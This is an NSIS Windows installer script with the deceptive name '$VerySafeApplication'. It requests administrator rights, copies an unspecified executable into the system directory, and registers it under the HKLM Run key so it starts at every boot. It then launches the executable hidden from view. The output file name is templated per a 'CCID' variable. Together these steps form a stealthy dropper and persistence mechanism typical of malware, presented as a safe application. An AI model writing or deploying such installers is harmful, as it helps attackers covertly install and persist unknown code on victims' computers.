!define APP_VERSION "1.0.0"
!define SW_HIDE 0
Name "$VerySafeApplication ${APP_VERSION}"
OutFile "target/${CCID}.exe"
InstallDir "$SYSDIR\${APP_NAME}"
RequestExecutionLevel admin

Section "Install"
    SetOutPath "$SYSDIR"
    File "${APP_EXE}"

    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" \
        "${APP_NAME}" "$SYSDIR\${APP_NAME}.exe"

    System::Call 'shell32::ShellExecute(i 0, t "open", t "$SYSDIR\${APP_NAME}.exe", t "", t "$SYSDIR", i ${SW_HIDE}) i .r0'
SectionEnd
